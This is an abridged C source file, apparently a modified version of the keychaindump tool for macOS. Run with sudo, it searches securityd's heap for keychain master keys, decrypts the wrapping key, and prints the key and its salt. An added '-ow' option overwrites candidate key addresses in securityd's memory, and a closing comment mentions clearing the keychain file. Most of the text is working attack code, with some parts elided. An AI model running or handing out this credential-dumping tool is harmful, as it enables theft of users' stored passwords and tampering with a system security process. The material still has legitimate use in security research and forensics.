...
// Modified by Brent Amrhein
// - Prints the salt used to generate the master key
// - Added option to write at the address of potential keys

// Build instructions:
// $ gcc keychaindump.c -o keychaindump -lcrypto

// Usage:
// $ sudo ./keychaindump [path] [options]
//
// where [path] is the path to the keychain file. If not specified, use default at
// ~/Library/Keychains/login.keychain
//
// Options:
//   -ow    overwrite potential keys in securityd's address space
...
// Flag for overwriting the keys discovered in securityd's heap.
int OVERWRITE_KEYS = 0;
        ...
        for (i = 0; i < read_sz - sizeof(unsigned long int); i += 4) {
            ...
            if (*p == 0x18) {
                ...
                if (address >= start && address <= stop) {
                    ...
                    if (OVERWRITE_KEYS) {
                        puts("Overwriting values in candidate key address spaces");
                        long value = -1;
                        if (vm_write(task, address, (vm_address_t) &value, sizeof(value))) {
                            printf("Error writing value %li to 0x%lx\n", value, address);
                        }
                    }
...
char *get_blob(char *buffer, size_t sz) {
...
int dump_wrapping_key(char *out, char *master, char *blob) {
    char iv[8];
    memcpy(iv, blob + 64, 8);
...
// Really simple/naive command-line argument handling
int handle_args(int argc, char **argv) {
    int i = 1;
    for (; i < argc; ++i) {
        if (!strncmp(argv[i], "-ow", 3)) {
            OVERWRITE_KEYS = 1;
        } else {
...
int main(int argc, char **argv) {
    ...
    for (i = 0; i < g_master_candidates_count; ++i) {
        ...
        char *blob = get_blob(buffer, sz);
        if (key_len = dump_wrapping_key(key, g_master_candidates[i], blob)) {
            printf("[+] Found master key: %s\n", s_key);
            // Now grab the master key salt from *blob and print it.
            char salt[20];
            memcpy(salt, blob + 44, 20);
            char s_salt[20*2+1];
            hex_string(s_salt, salt, 20);
            printf("[ b( ^ .^)b ] Found master key salt: %s\n", s_salt);
            break;
        }
    }
    if (!key_len) {
    ...
    // Clear the contents of the keychain file ...
